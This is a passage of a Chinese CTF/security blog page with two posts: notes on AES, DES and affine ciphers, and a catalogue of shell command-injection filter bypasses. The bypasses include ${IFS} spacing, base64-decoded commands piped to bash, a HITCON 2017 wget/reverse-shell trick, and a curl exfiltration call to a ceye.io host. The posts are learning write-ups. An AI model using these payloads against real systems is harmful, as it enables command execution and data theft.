<p><strong>模式</strong></p>
<p><strong>AES的工作模式，在于把明文块加密成密文块的处理过程</strong>，AES加密的五种模式：</p>
<p><code>ECB CBC CTR CFB OFB</code> 。</p>
<p>ECB(默认): 电码本模式</p>
<p>CBC:密码分组链接模式</p>
<p>CTR:计算机模式</p>
<p>CFB: 密码反馈模式</p>
<p>OFB：输出反馈模式</p>
<p><strong>AES加密与解密必须使用同一种模式</strong>（加密时使用ECB模式，解密必须也为ECB)</p>
<p><strong>AES算法底层原理解析</strong></p>
<p><img src="https://img-blog.csdn.net/20180412234649347?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>流程:</p>
<ul>
<li>输入一段明文，按每十六个字节分为一组进行分组，不足十六个字节的组进行padding。</li>
<li>每一块明文利用AES加密器和密钥进行加密。</li>
<li>拼接密文输出。</li>
</ul>
<p><strong>明文加密过程</strong>(扩展密钥)</p>
<p><img src="https://img-blog.csdn.net/20180412234742503?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>从上图我们可以看到，明文经过多轮加密最后生成密文。</p>
<p>轮数：</p>
<ul>
<li>初始轮 1次</li>
<li>普通轮 N次(和密钥长度有关)</li>
<li>最终轮 1次</li>
</ul>
<p>密钥的长度决定了加密的轮数。</p>
<p>初始轮步骤：加轮密钥</p>
<p>普通轮步骤：字节代替，行移位，列混淆，加轮密钥</p>
<p>最终轮步骤：字节代替，行移位，加轮密钥</p>
<p><strong>步骤详解</strong></p>
<p>1.字节替代</p>
<p><img src="https://img-blog.csdn.net/20180412234847338?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>在加密过程中，16字节的明文在每一个处理步骤中都会被排列为4*4的二位数组，在替代步骤中根据S盒(一个16 * 16的二维常量数组)，如明文块中a[2,2]=5B,那么在输出中b[2,2]=S[5][11]。下面是S盒</p>
<p><img src="https://img-blog.csdn.net/20160113155714985" alt="è¿éåå¾çæè¿°"></p>
<p>2.行移位</p>
<p><img src="https://img-blog.csdn.net/20180412234903455?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>这个步骤很简单的，第一个不变，第二行循环向左移动一个字节，第三行两个，以此类推。</p>
<p>3.列混淆</p>
<p><img src="https://img-blog.csdn.net/20180412234917268?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s0msagsuj30gn04s74j.jpg" alt="img"></p>
<p>计算方式为</p>
<p>47 = (02•87)⊕(03•6E)⊕(01•4A)⊕(01•A6)</p>
<p>最后输出相应的矩阵。</p>
<p>4.加轮密钥</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2t2pzuv8nj30hs0dugrb.jpg" alt="img"></p>
<p>唯一利用到密钥的一步，16位的密钥同样被排列为4<em>4的矩阵，对应位置进行异或生成新的值，*</em>这里需要注意的是：每一轮的加密密钥都不相同(扩展密钥)**</p>
<p><strong>扩展密钥概念</strong>：AES源代码中用长度 4 * 4 *（10+1） 字节的数组W来存储所有轮的密钥。W{0-15}的值等同于原始密钥的值，用于为初始轮做处理。</p>
<p>后续每一个元素W[i]都是由W[i-4]和W[i-1]计算而来，直到数组W的所有元素都赋值完成。</p>
<p>W数组当中，W{0-15}用于初始轮的处理，W{16-31}用于第1轮的处理，W{32-47}用于第2轮的处理 ……一直到W{160-175}用于最终轮（第10轮）的处理。</p>
<p>加密:初始轮—-普通轮—-最终轮</p>
<p>解密:最终轮—–普通轮—-初始轮</p>
<p><strong>不同模式进行加密时的区别</strong></p>
<p><strong>ECB模式</strong>:(默认的最简单加密模式)，该模式下，每一个明文块的加密完全独立，互不干涉。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s10nn38bj30gy09dgna.jpg" alt="img"></p>
<p>安全性较差:相同的明文块加密后生成相同的密文块。</p>
<p><strong>CBC模式</strong>（这应该也是很重要的一个模式，涉及后面的CBC字节翻转攻击):特点为引入一个初始向量，先与明文块进行异或，再进行加密，加密后的密文块在于新的明文块进行异或，在进行加密，生成新的密文块。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s12o78cqj30hs09n0u8.jpg" alt="img"></p>
<p><strong>CFB模式</strong></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cfb_encryption.png" alt="img"></p>
<p>与CBC不同的是密文块是先进行加密再与明文块xor，而不是CBC的先与明文块xor，再加密，但是也面临的重放攻击(未学)。</p>
<p><strong>OFB模式</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s1e8tvg5j3094049a9w.jpg" alt="img"></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ofb_decryption.png" alt="img"></p>
<p>OFB模式是一种效率很高的加密模式，准备好密钥流，快速与明文进行xor，生成密文</p>
<p><strong>CTR模式</strong></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ctr_encryption.png" alt="img"></p>
<p>计数器模式。</p>
<h3 id="DES加密"><a href="#DES加密" class="headerlink" title="DES加密"></a><strong>DES加密</strong></h3><p>DES加密流程图如下:看一看基本上就会明白的。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slf3xo11j308c09omxv.jpg" alt="img"></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/figure/des.gif" alt="img"></p>
<p><strong>流程简述</strong>:</p>
<ul>
<li>将明文变为64位二进制格式，进行初始置换IP。</li>
<li>分为两个32位的组,<strong>对于右面三十二位:先将32位扩展为48位并且与48位密钥进行异或，经过S盒压缩，再次变为32位，再次进行P盒置换，与左32位进行异或操作，最终得到右面的32位，左面的32位数据变为原来右面的32位。</strong></li>
<li>如此变换经过16轮，最终经过逆置换IP，得到最终密文。</li>
</ul>
<p>解密过程:通过16轮密钥逆向此过程得到明文。</p>
<p><strong>密钥的产生：子密钥 Ki（48 bit）生成算法</strong>(共十六个)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slg21wfbj30mz0hfgmu.jpg" alt="img"></p>
<ul>
<li>不考虑每个字节的第8位，DES的密钥由64位减至56位，每个字节的第8位作为奇偶校验位。产生的56位密钥由下表生成（注意表中没有8,16,24，32,40,48,56和64这8位)。</li>
<li>将五十六位密钥分为两部分，根据轮数，这两部分分别循环左移一位或者两位</li>
<li>从移动完毕后的48位作为这一轮的密钥去与经过扩展完毕后的48位数据进行异或操作。根据此表选出48位数据。</li>
</ul>
<p><img src="http://dl2.iteye.com/upload/attachment/0098/9555/78c0a354-e216-32db-9310-d1f3abcaf1b5.png" alt="img"></p>
<p><strong>双重DES</strong></p>
<p>双重DES使用两个密钥，长度为112比特，加密方式如下:</p>
<p>C=Ek2(EK1(P))</p>
<p><strong>Ek1代表第一次加密，Ek2代表第二次加密</strong>。</p>
<p><strong>安全问题</strong>：<code>中间相遇攻击</code></p>
<p>如wiki所示</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2sl98h1hmj30te0ccwga.jpg" alt="img"></p>
<p><strong>三重DES</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slalxw2yj30t30fu0u0.jpg" alt="img"></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slh10apsj30og0oq42y.jpg" alt="img"></p>
<p><strong>仿射加密剖析:</strong></p>
<p>仿射加密的原理很简单</p>
<p>加密函数 <code>E(x)=(ax+b)(mod m)</code></p>
<ul>
<li>x表示明文按某种编码得到的数字</li>
<li>a和m互为质数</li>
<li>m为编码系统中字母的数目</li>
</ul>
<p>解密函数D(x)=<code>a的逆元(x-b)(mod m)</code></p>
<p><strong>破解分析</strong></p>
<p>当a=1时，仿射加密为凯撒加密，就会很容易被破解了。</p>
<p>当a!=1时，通常字符集选取的为字母表，一般为26个字母，小于26且与26互素的个数:根据欧拉定理可得26(1-1/2)(1-1/13)=12.</p>
<p><strong>密钥空间为</strong>:12*26=312 （其实并不是太安全)</p>
<p><strong>已知部分明文进行攻击</strong>：</p>
<p>如wiki所言:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2szt9mqdjj30pt0ektas.jpg" alt="img"></p>
<p>直接一个做差就可以很简单的求出a了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TWCTF 2016 的 super_express</span><br><span class="line">import sys</span><br><span class="line">key &#x3D; &#39;****CENSORED***************&#39;</span><br><span class="line">flag &#x3D; &#39;TWCTF&#123;*******CENSORED********&#125;&#39;</span><br><span class="line"></span><br><span class="line">if len(key) % 2 &#x3D;&#x3D; 1:</span><br><span class="line">    print(&quot;Key Length Error&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">n &#x3D; len(key) &#x2F; 2</span><br><span class="line">encrypted &#x3D; &#39;&#39;</span><br><span class="line">for c in flag:</span><br><span class="line">    c &#x3D; ord(c)</span><br><span class="line">    for a, b in zip(key[0:n], key[n:2*n]):</span><br><span class="line">        c &#x3D; (ord(a) * c + ord(b)) % 251</span><br><span class="line">    encrypted +&#x3D; &#39;%02x&#39; % c</span><br><span class="line"></span><br><span class="line">print encrypted</span><br></pre></td></tr></table></figure>

<p>代码逻辑很简单，<strong>对flag中的每一个字母加密n次</strong>，但是不管怎么加密，key是固定的。最终的形式肯定都为<code>Cn=(x*c+y)%251</code></p>
<p>利用上面的知识，我们可以很轻松的很出脚本</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2szzzpelaj315t0lyae6.jpg" alt="img"></p>
<p>这里总结出了一个小tip:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2t0h9mvaej30x80jgtc8.jpg" alt="img"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/Crypto%D1%A7%CF%B0/" data-id="ckabsu37y000rkkvrgvvffjxy" class="article-share-link" data-share="baidu" data-title="Crypto学习">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/Crypto%D1%A7%CF%B0/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-命令执行绕过" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" class="article-date">
  <time datetime="2019-06-01T08:30:36.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/">命令执行绕过</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="命令执行过滤函数与绕过机制"><a href="#命令执行过滤函数与绕过机制" class="headerlink" title="命令执行过滤函数与绕过机制"></a>命令执行过滤函数与绕过机制</h3><p>escapeshellcmd函数：<strong>字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。(对可能进行欺骗命令执行函数的字符进行转义)，下面来具体的看一下这个函数：</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpuosbqzj310d0j6whe.jpg" alt=""></p>
<p>再看一下源码(阅读源码有些吃力Orz)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpved7sjj30r809oq30.jpg" alt=""></p>
<p>在windows平台是通过<code>^</code>来取消特殊字符的意义的，linux下应该是直接通过<code>\\</code>来转义的,但是这里在windows下bat文件存在特别之处。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpvn5jfvj31a10megn8.jpg" alt=""></p>
<p>成功用%1a绕过并进行命令执行，如果我们用<code>||,|,&amp;,&amp;&amp;</code>这些命令管道分隔符，是会被函数转义过滤掉的。这里在说一下常用的几个管道符，我比较常用的是&amp;&amp;，|。</p>
<p>在linux下：</p>
<p><code>|</code> 无论前面的命令存在与否，都只会显示后面命令的执行结果。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpw5t6rdj30k302l0tc.jpg" alt=""></p>
<p><code>&amp;&amp;</code>必须要前面的命令是正确的，才可以执行后面的命令，并且会把两个命令的执行结果都显示出来。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpwgcb54j30jz0b2788.jpg" alt=""></p>
<h3 id="绕过命令中对空格的过滤"><a href="#绕过命令中对空格的过滤" class="headerlink" title="绕过命令中对空格的过滤"></a>绕过命令中对空格的过滤</h3><h4 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h4><p><strong>${IFS}绕过</strong>：在linux下，${IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。</p>
<p><strong>${IFS}$9绕过：</strong>$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpx2hd5bj30k4024weu.jpg" alt=""></p>
<p>同样这里也可以cat${IFS}$9flag</p>
<h4 id="重定向符绕过"><a href="#重定向符绕过" class="headerlink" title="重定向符绕过"></a>重定向符绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:cat&lt;&gt;flag</span><br><span class="line">payload2:cat&lt;flag</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxbvp7qj30ee025gls.jpg" alt=""></p>
<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:a&#x3D;c;b&#x3D;at;$a$b flag</span><br><span class="line"></span><br><span class="line">You GET IT</span><br></pre></td></tr></table></figure>

<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"></span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# &#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;</span><br><span class="line">You Get It</span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br><span class="line">You Get It</span><br><span class="line">&#96;反引号在Linux下代表命令执行,这个命令代表着将字符串进行base64解码，然后输出这个命令执行后的信息</span><br></pre></td></tr></table></figure>

<h4 id="利用文件中的字母绕"><a href="#利用文件中的字母绕" class="headerlink" title="利用文件中的字母绕"></a>利用文件中的字母绕</h4><p>payload :<code>expr substr $(awk NR==1 epoch) 1 1` “`expr substr $(awk NR==2 epoch) 1 1</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxlv3cgj30k609ogo5.jpg" alt=""></p>
<h4 id="IP中-的绕过"><a href="#IP中-的绕过" class="headerlink" title="IP中.的绕过"></a>IP中.的绕过</h4><p>将IP转化为长整数—-转换在线工具</p>
<p><a href="http://www.msxindl.com/tools/ip/ip_num.asp" target="_blank" rel="noopener">http://www.msxindl.com/tools/ip/ip_num.asp</a></p>
<h4 id="单引号-双引号绕过"><a href="#单引号-双引号绕过" class="headerlink" title="单引号 双引号绕过"></a>单引号 双引号绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&quot;&quot;lag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;&#39;lag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;l&#39;ag</span><br><span class="line">You Get It</span><br><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f&#39;la&#39;g</span><br><span class="line">You Get It</span><br></pre></td></tr></table></figure>

<p>都可以进行绕过</p>
<h4 id="反斜线绕过"><a href="#反斜线绕过" class="headerlink" title="反斜线绕过"></a>反斜线绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@aohan-virtual-machine:&#x2F;home&#x2F;aohan# cat f\lag</span><br><span class="line">You Get It</span><br></pre></td></tr></table></figure>

<h3 id="无命令回显"><a href="#无命令回显" class="headerlink" title="无命令回显"></a>无命令回显</h3><p>例如HITCON2017的一道题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(strlen($_GET[test])&lt;8)&#123;</span><br><span class="line"></span><br><span class="line">echo shell_exec($_GET[test]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>就可以利用&gt;写入文件名，<code>&gt;wget\\，&gt;www.baidu.com\\ ,ls -t &gt;g, sh g</code>,执行命令，这里可以把百度换成自己vps上的文件反弹shell操作。</p>
<p><strong>第二种无回显操作方法：</strong></p>
<p>利用<code>ceye.io</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpxv956tj314a0kfdhr.jpg" alt=""></p>
<p>因为在Linux下exec与shell_exec这种函数基本上是没有回显的，所以我们只能把内容打到ceye.io上，执行命令`curl <a href="http://f1f0nd.ceye.io/```whoami" target="_blank" rel="noopener">http://f1f0nd.ceye.io/```whoami</a> ``,然后可以看到命令的回显</p>
<h3 id="LINUX下一些已有字符"><a href="#LINUX下一些已有字符" class="headerlink" title="LINUX下一些已有字符"></a>LINUX下一些已有字符</h3><ul>
<li>${PS2} 对应字符 ‘&gt;’</li>
<li>${PS4} 对应字符 ‘+’</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" data-id="ckabsu396003nkkvrbus8gqk3" class="article-share-link" data-share="baidu" data-title="命令执行绕过">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/6/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/8/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
